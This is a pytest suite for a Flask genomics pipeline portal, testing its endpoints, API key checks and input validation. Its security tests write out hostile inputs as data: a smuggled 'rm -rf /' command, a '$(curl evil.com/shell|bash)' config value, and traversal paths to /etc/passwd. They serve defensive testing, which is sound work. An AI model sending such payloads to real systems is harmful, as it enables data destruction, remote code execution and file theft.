"""
Tests for Genomics Pipeline Web Portal server.
"""
import pytest
import json
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import sys

# Add the app directory to the path
sys.path.insert(0, str(Path(__file__).parent.parent / 'app'))


class TestStatusEndpoint:
    """Tests for /api/status endpoint."""

    def test_status_returns_json(self, client, mock_subprocess, mock_psutil):
        """Test that status endpoint returns JSON."""
        with patch('server.NVML_AVAILABLE', False):
            response = client.get('/api/status')
            assert response.status_code == 200
            assert response.content_type == 'application/json'

    def test_status_contains_pipeline_state(self, client, mock_subprocess, mock_psutil):
        """Test status includes pipeline state."""
        with patch('server.NVML_AVAILABLE', False):
            response = client.get('/api/status')
            data = json.loads(response.data)
            assert 'pipeline' in data
            assert 'status' in data['pipeline']

    def test_status_contains_system_info(self, client, mock_subprocess, mock_psutil):
        """Test status includes system information."""
        with patch('server.NVML_AVAILABLE', False):
            response = client.get('/api/status')
            data = json.loads(response.data)
            assert 'system' in data
            assert 'docker_installed' in data['system']
            assert 'gpu_available' in data['system']
            assert 'disk_space' in data['system']

    def test_status_contains_data_status(self, client, mock_subprocess, mock_psutil):
        """Test status includes data file status."""
        with patch('server.NVML_AVAILABLE', False):
            response = client.get('/api/status')
            data = json.loads(response.data)
            assert 'data' in data
            assert 'fastq_r1' in data['data']
            assert 'reference' in data['data']


class TestConfigEndpoint:
    """Tests for /api/config endpoint."""

    def test_get_config(self, client):
        """Test getting configuration."""
        response = client.get('/api/config')
        assert response.status_code == 200
        data = json.loads(response.data)
        # Should return a dictionary (possibly empty)
        assert isinstance(data, dict)

    def test_post_config_success(self, client, tmp_path):
        """Test updating configuration."""
        with patch('server.CONFIG_FILE', tmp_path / 'test.env'):
            # Create the config file
            (tmp_path / 'test.env').write_text("# Test config\nPATIENT_ID=HG002\n")

            response = client.post(
                '/api/config',
                data=json.dumps({'PATIENT_ID': 'HG003'}),
                content_type='application/json'
            )

            assert response.status_code == 200
            data = json.loads(response.data)
            assert data.get('success') == True


class TestRunEndpoint:
    """Tests for /api/run/<step> endpoint."""

    def test_run_invalid_step(self, client):
        """Test running invalid step returns error."""
        response = client.post('/api/run/invalid_step')
        assert response.status_code == 400
        data = json.loads(response.data)
        assert 'error' in data

    def test_run_valid_step(self, client, mock_subprocess):
        """Test running valid step starts execution."""
        with patch('server.pipeline_state', {'status': 'idle', 'logs': [], 'progress': 0}):
            with patch('server.threading.Thread') as mock_thread:
                mock_thread.return_value = Mock()
                response = client.post('/api/run/check')

                assert response.status_code == 200
                data = json.loads(response.data)
                assert data.get('success') == True
                assert data.get('step') == 'Prerequisites Check'

    def test_run_while_running(self, client):
        """Test cannot run step while another is running."""
        with patch('server.pipeline_state', {'status': 'running', 'logs': [], 'progress': 0}):
            response = client.post('/api/run/check')
            assert response.status_code == 400
            data = json.loads(response.data)
            assert 'error' in data


class TestStopEndpoint:
    """Tests for /api/stop endpoint."""

    def test_stop_success(self, client):
        """Test stopping running process."""
        with patch('server.running_processes', {}):
            with patch('server.pipeline_state', {'status': 'running'}):
                response = client.post('/api/stop')
                assert response.status_code == 200
                data = json.loads(response.data)
                assert data.get('success') == True


class TestStopAllEndpoint:
    """Tests for /api/stop-all endpoint."""

    def test_stop_all_success(self, client, mock_subprocess, mock_psutil):
        """Test stopping all processes."""
        mock_psutil.process_iter.return_value = []
        with patch('server.running_processes', {}):
            with patch('server.pipeline_state', {'status': 'running'}):
                response = client.post('/api/stop-all')
                assert response.status_code == 200
                data = json.loads(response.data)
                assert data.get('success') == True


class TestLogsEndpoint:
    """Tests for /api/logs/<log_type> endpoint."""

    def test_logs_invalid_type(self, client):
        """Test invalid log type returns error."""
        response = client.get('/api/logs/invalid_type')
        assert response.status_code == 400

    def test_logs_missing_file(self, client, tmp_path):
        """Test missing log file returns message."""
        with patch('server.LOG_DIR', tmp_path):
            response = client.get('/api/logs/chr20_fq2bam')
            assert response.status_code == 200
            data = json.loads(response.data)
            assert 'not found' in data.get('content', '').lower()


class TestMetricsEndpoint:
    """Tests for /api/metrics endpoint."""

    def test_metrics_returns_json(self, client, mock_psutil):
        """Test metrics endpoint returns JSON."""
        with patch('server.NVML_AVAILABLE', False):
            with patch('server.pipeline_state', {
                'status': 'idle',
                'start_time': None,
                'end_time': None,
                'current_step': None,
                'runtime_seconds': 0,
            }):
                response = client.get('/api/metrics')
                assert response.status_code == 200
                assert response.content_type == 'application/json'

    def test_metrics_contains_throughput(self, client, mock_psutil):
        """Test metrics includes throughput."""
        with patch('server.NVML_AVAILABLE', False):
            with patch('server.pipeline_state', {
                'status': 'idle',
                'start_time': None,
                'end_time': None,
                'current_step': None,
                'runtime_seconds': 0,
            }):
                response = client.get('/api/metrics')
                data = json.loads(response.data)
                assert 'throughput_gb_hr' in data
                assert 'runtime_seconds' in data
                assert 'gpu_utilization' in data


class TestHelperFunctions:
    """Tests for helper functions."""

    def test_check_docker_installed(self, mock_subprocess):
        """Test Docker check."""
        from server import check_docker
        mock_subprocess.run.return_value = Mock(returncode=0)
        assert check_docker() == True

    def test_check_docker_not_installed(self, mock_subprocess):
        """Test Docker not installed."""
        from server import check_docker
        mock_subprocess.run.side_effect = Exception("Docker not found")
        assert check_docker() == False

    def test_check_gpu_available(self, mock_subprocess):
        """Test GPU check."""
        from server import check_gpu
        mock_subprocess.run.return_value = Mock(returncode=0)
        assert check_gpu() == True

    def test_check_gpu_not_available(self, mock_subprocess):
        """Test GPU not available."""
        from server import check_gpu
        mock_subprocess.run.side_effect = Exception("nvidia-smi not found")
        assert check_gpu() == False

    def test_get_file_size_existing(self, tmp_path):
        """Test file size for existing file."""
        from server import get_file_size

        test_file = tmp_path / 'test.txt'
        test_file.write_text('x' * 1024)  # 1KB file

        size = get_file_size(test_file)
        assert '1.' in size or '1024' in size  # Either 1.x KB or 1024 B

    def test_get_file_size_missing(self):
        """Test file size for missing file."""
        from server import get_file_size
        size = get_file_size('/nonexistent/file.txt')
        assert size == 'N/A'


class TestGPUUtilization:
    """Tests for GPU utilization functions."""

    def test_get_gpu_utilization_no_nvml(self):
        """Test GPU utilization when pynvml not available."""
        from server import get_gpu_utilization

        with patch('server.NVML_AVAILABLE', False):
            result = get_gpu_utilization()
            assert result['available'] == False
            assert result['devices'] == []

    def test_get_gpu_utilization_with_nvml(self, mock_pynvml):
        """Test GPU utilization with pynvml mocked."""
        with patch('server.NVML_AVAILABLE', True):
            with patch('server.pynvml', mock_pynvml, create=True):
                from server import get_gpu_utilization
                result = get_gpu_utilization()
                assert result['available'] == True


class TestCPUUtilization:
    """Tests for CPU utilization functions."""

    def test_get_cpu_utilization(self, mock_psutil):
        """Test CPU utilization."""
        from server import get_cpu_utilization
        result = get_cpu_utilization()
        assert 'percent' in result
        assert 'count' in result
        assert result['percent'] == 25.5


class TestMemoryUtilization:
    """Tests for memory utilization functions."""

    def test_get_memory_utilization(self, mock_psutil):
        """Test memory utilization."""
        from server import get_memory_utilization
        result = get_memory_utilization()
        assert 'percent' in result
        assert 'used_gb' in result
        assert 'total_gb' in result
        assert result['percent'] == 45.0


class TestStreamEndpoint:
    """Tests for /api/stream SSE endpoint."""

    def test_stream_endpoint_returns_event_stream(self, client):
        """Test stream endpoint returns event-stream content type."""
        with patch('server.pipeline_state', {
            'status': 'idle',
            'current_step': None,
            'start_time': None,
            'end_time': None,
            'error_message': None,
            'logs': []
        }):
            response = client.get('/api/stream')
            # SSE endpoints return event-stream
            assert 'text/event-stream' in response.content_type


class TestInputValidation:
    """Tests for input validation."""

    def test_run_step_validates_input(self, client):
        """Test that run step rejects malicious input."""
        # SQL injection attempt — Flask may return 404 (route not matched) or 405
        response = client.post('/api/run/check;rm -rf /')
        assert response.status_code in (400, 404, 405)

        # Path traversal attempt — Werkzeug normalizes ../  before routing
        response = client.post('/api/run/../../../etc/passwd')
        assert response.status_code in (400, 404, 405)

    def test_logs_validates_input(self, client):
        """Test that logs endpoint rejects malicious input."""
        # Path traversal attempt — Werkzeug normalizes ../ before routing
        response = client.get('/api/logs/../../../etc/passwd')
        assert response.status_code in (400, 404)

    def test_config_post_rejects_shell_injection(self, client, tmp_path):
        """Test that config POST rejects shell metacharacters."""
        with patch('server.CONFIG_FILE', tmp_path / 'test.env'):
            (tmp_path / 'test.env').write_text("# Config\n")
            response = client.post(
                '/api/config',
                data=json.dumps({'PB_IMG': '$(curl evil.com/shell|bash)'}),
                content_type='application/json'
            )
            assert response.status_code == 400
            data = json.loads(response.data)
            assert 'error' in data

    def test_config_post_rejects_lowercase_key(self, client, tmp_path):
        """Test that config POST rejects invalid key format."""
        with patch('server.CONFIG_FILE', tmp_path / 'test.env'):
            (tmp_path / 'test.env').write_text("# Config\n")
            response = client.post(
                '/api/config',
                data=json.dumps({'invalid_key': 'value'}),
                content_type='application/json'
            )
            assert response.status_code == 400


class TestApiKeyAuth:
    """Tests for require_api_key decorator."""

    def test_run_requires_api_key(self, client):
        """Test that /api/run requires API key when PORTAL_API_KEY is set."""
        with patch.dict('os.environ', {'PORTAL_API_KEY': 'test-secret-key'}):
            with patch('server.pipeline_state', {'status': 'idle', 'logs': [], 'progress': 0}):
                response = client.post('/api/run/check')
                assert response.status_code == 401
                data = json.loads(response.data)
                assert 'Unauthorized' in data.get('error', '')

    def test_run_accepts_valid_key(self, client, mock_subprocess):
        """Test that /api/run works with correct API key."""
        with patch.dict('os.environ', {'PORTAL_API_KEY': 'test-secret-key'}):
            with patch('server.pipeline_state', {'status': 'idle', 'logs': [], 'progress': 0}):
                with patch('server.threading.Thread') as mock_thread:
                    mock_thread.return_value = Mock()
                    response = client.post(
                        '/api/run/check',
                        headers={'X-API-Key': 'test-secret-key'}
                    )
                    assert response.status_code == 200

    def test_run_allows_without_key_set(self, client, mock_subprocess):
        """Test that /api/run works when PORTAL_API_KEY is not set (dev mode)."""
        with patch.dict('os.environ', {}, clear=False):
            # Ensure PORTAL_API_KEY is not set
            import os
            env = os.environ.copy()
            env.pop('PORTAL_API_KEY', None)
            with patch.dict('os.environ', env, clear=True):
                with patch('server.pipeline_state', {'status': 'idle', 'logs': [], 'progress': 0}):
                    with patch('server.threading.Thread') as mock_thread:
                        mock_thread.return_value = Mock()
                        response = client.post('/api/run/check')
                        assert response.status_code == 200

    def test_stop_requires_api_key(self, client):
        """Test that /api/stop requires API key."""
        with patch.dict('os.environ', {'PORTAL_API_KEY': 'test-secret-key'}):
            with patch('server.running_processes', {}):
                with patch('server.pipeline_state', {'status': 'running'}):
                    response = client.post('/api/stop')
                    assert response.status_code == 401

    def test_reset_requires_api_key(self, client, tmp_path):
        """Test that /api/reset requires API key."""
        with patch.dict('os.environ', {'PORTAL_API_KEY': 'test-secret-key'}):
            with patch('server.STATE_FILE', tmp_path / 'state.json'):
                response = client.post('/api/reset')
                assert response.status_code == 401


class TestPathTraversal:
    """Tests for path traversal prevention in file operations."""

    def test_download_rejects_dotdot(self, client):
        """Test that download rejects path traversal via '..'."""
        response = client.get('/api/files/download/output/..%2F..%2Fetc%2Fpasswd')
        assert response.status_code in (400, 404)

    def test_download_sanitizes_filename(self, client, tmp_path):
        """Test that download uses secure_filename."""
        with patch('server.DATA_DIR', tmp_path):
            (tmp_path / 'output').mkdir(exist_ok=True)
            response = client.get('/api/files/download/output/..%2Fsecret.txt')
            assert response.status_code in (400, 404)

    def test_delete_rejects_dotdot(self, client):
        """Test that delete rejects path traversal via '..'."""
        response = client.delete('/api/files/delete/output/..%2F..%2Fetc%2Fpasswd')
        assert response.status_code in (400, 404)

    def test_upload_sanitizes_filename(self, client, tmp_path):
        """Test that upload sanitizes filenames using secure_filename."""
        with patch('server.DATA_DIR', tmp_path):
            (tmp_path / 'input').mkdir(exist_ok=True)
            import io
            data = {'file': (io.BytesIO(b'test data'), '../../evil.sh')}
            response = client.post(
                '/api/files/upload/input',
                data=data,
                content_type='multipart/form-data'
            )
            # Should either sanitize the name or reject it
            if response.status_code == 200:
                result = json.loads(response.data)
                # secure_filename strips traversal chars
                assert '..' not in result.get('filename', '')
                assert '/' not in result.get('filename', '')
            else:
                assert response.status_code == 400
